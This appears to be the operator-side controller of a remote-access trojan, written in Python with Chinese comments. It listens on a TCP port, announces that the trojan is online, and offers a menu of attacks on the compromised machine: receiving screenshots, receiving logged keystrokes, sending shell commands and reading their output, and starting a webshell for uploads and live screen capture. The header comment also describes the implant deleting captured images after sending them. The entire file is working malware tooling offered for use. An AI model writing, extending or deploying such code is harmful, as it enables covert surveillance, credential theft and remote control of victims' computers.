# client-exe
# 建立tcp通道，利用工具截屏，保存文件，读取字节并发送数据包
# 直到发送完成，删除图片
import socket
import sys
import threading
import struct
import os


def deal_data(console, addr):
    print("一个新的连接:{}".format(addr))
    while 1:
        # 设定文件大小
        fileinfo_szie = struct.calcsize("128sl")

        buf = console.recv(fileinfo_szie)

        if buf:
            filename, filesize = struct.unpack('128sl', buf)
            fn = filename.strip(str.encode('\00'))
            print(str.encode('\00'))
            print(fn)
            # 新文件名
            newFn = os.path.join(str.encode('./'), str.encode('new_')+fn)
            print('新文件名:{},文件大小为{}'.format(newFn, filesize))
            # 接收文件流
            # 定义一个接受文件的大小
            recvd_size = 0
            recvfp = open(newFn, 'wb')
            print('开始接收....')
            while not recvd_size == filesize:
                if filesize-recvd_size > 1024:
                    # 如果总大小减去已经接收到的文件大小，还大于1024，继续按1024
                    data = console.recv(1024)
                    recvd_size += len(data)
                else:
                    # 如果待接收文件内容的大小小于1024，则说不够1k .就直接取剩下的
                    data = console.recv(filesize-recvd_size)
                    recvd_size = filesize
                recvfp.write(data)
            recvfp.close()
            print('文件接收完成')
        # console.close()


def socket_main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # SO_REUSEADDR停止后销毁，表示将socket关闭后，立即释放端口
        # 否则系统会保留几分钟才会释放
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("", 14445))
        s.listen(10)
        return s
    except socket.error as e:
        print(e)
        sys.exit(1)       
    print("waiting......")

def socket_service():
    s = socket_main()
    while 1:
        console,addr = s.accept()
        # 增加线程，增加并发
        t = threading.Thread(target=deal_data,args=(console,addr))
        t.start()
#监听键盘方法        
def listen_keyboard():
    s = socket_main()
    while True:
        console,addr = s.accept()
        while True:
            keyDa = console.recv(1024)
            if keyDa:
                print(keyDa.decode())
                break

#命令行控制方法
def cmdContorl():
    s=socket_main()
    while 1:
        cmd = input('操作命令行>>')
        client,addr = s.accept()
        client.send(cmd.encode())
        data = client.recv(4096)
        print("{}".format(data.decode('utf-8')))
    
#webshell控制
def webshell():
    s=socket_main()
    client,addr = s.accept()
    print("webshell")
    while True:
        port = input("请选择启动的端口")
        if not port.strip().isdigit():
            continue
        else:
            print('提示1：/是上传程序,提示2:/cmd?参数(cmd或者dir),提示3:/screenshot是实时监控屏幕')
            print('')
            client.send(port.encode())
            client.close()
            s.close()
            break


if __name__ == "__main__":
    opation = [1,2,3,4]
    s = socket_main()
    client,addr = s.accept()
    print("木马已上线")
    print("请选择你对受控机进行的攻击")
    print("1:监控屏幕,2:键盘监控,3:命令行操作,4:webshell")
    while 1:   
        select = input("请输入>>>>.")
        if int(select) in opation:
            client.send(select.encode())
            client.close()
            break
        else:
            s.close()
            pass    
    s.close()       
    if select==str(1):
        socket_service()
    elif select==str(2):
        listen_keyboard()
    elif select==str(3):
        cmdContorl()
    elif select==str(4):
        webshell()                    